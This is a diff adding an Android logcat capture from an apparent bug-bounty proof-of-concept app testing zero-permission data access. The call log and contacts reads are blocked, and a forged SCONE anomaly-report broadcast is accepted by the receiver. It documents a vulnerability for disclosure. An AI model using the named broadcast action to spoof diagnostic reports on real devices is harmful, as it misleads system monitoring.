@@ -1,0 +1,25 @@
+09-10 09:43:52.048 32322 32349 I VRP_DATALEAK: CALL_LOG_BLOCKED: Permission Denial: opening provider com.android.providers.contacts.CallLogProvider from ProcessRecord{2007b62 32322:com.vrp.poc/u0a156} (pid=32322, uid=10156) requires android.permission.READ_CALL_LOG or android.permission.WRITE_CALL_LOG
+09-10 09:43:52.170 32322 32349 I VRP_DATALEAK: CONTACTS_BLOCKED: Permission Denial: opening provider com.android.providers.contacts.ContactsProvider2 from ProcessRecord{2007b62 32322:com.vrp.poc/u0a156} (pid=32322, uid=10156) requires android.permission.READ_CONTACTS or android.permission.WRITE_CONTACTS
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: SCONE_BROADCAST_SENT_FROM_APP
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: === Zero-Permission Data Leak PoC ===
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: UID: 10156
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: PID: 32322
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: 
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: --- CALL LOG TEST (requires READ_CALL_LOG) ---
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   BLOCKED: Permission Denial: opening provider com.android.providers.contacts.CallLogProvider from ProcessRecord{2007b62 32322:com.vrp.poc/u0a156} (pid=32322, uid=10156) requires android.permission.READ_CALL_LOG or android.permission.WRITE_CALL_LOG
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: 
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: --- CONTACTS TEST (requires READ_CONTACTS) ---
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   BLOCKED: Permission Denial: opening provider com.android.providers.contacts.ContactsProvider2 from ProcessRecord{2007b62 32322:com.vrp.poc/u0a156} (pid=32322, uid=10156) requires android.permission.READ_CONTACTS or android.permission.WRITE_CONTACTS
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: 
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: --- WATCHFACE INSTANCES TEST (no permission declared) ---
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   ERROR: IllegalArgumentException: No matching uri.
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   /instances path - Rows: 0
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: 
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: --- SCONE FORGED BROADCAST TEST ---
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Broadcast SENT (no SecurityException)
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Action: com.google.android.apps.scone.ACTION_ANOMALY_REPORTED
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Issue type: LINE1_NUMBER_ERROR
+09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Description: FORGED_FROM_ZERO_PERM_APP_UID_10156
+09-10 09:44:01.231 30468 32612 I CMBroadCastReceiver: SCONE anomaly received, issue type:LINE1_NUMBER_ERROR desc:FORGED_FROM_ZERO_PERM_APP_UID_10156
+09-10 09:44:01.287 30468 32612 W ConnectivityEventWriter: Failed to add tag: ConnectivityMonitorEventMetadata{eventTimestampMs=1789013641253, subscriptionId=Optional.empty, slotId=Optional.empty}
+09-10 09:44:01.297 30468 32612 D BugReportGenerator: Bugreport not available for non userdebug mode: LINE1_NUMBER_ERROR
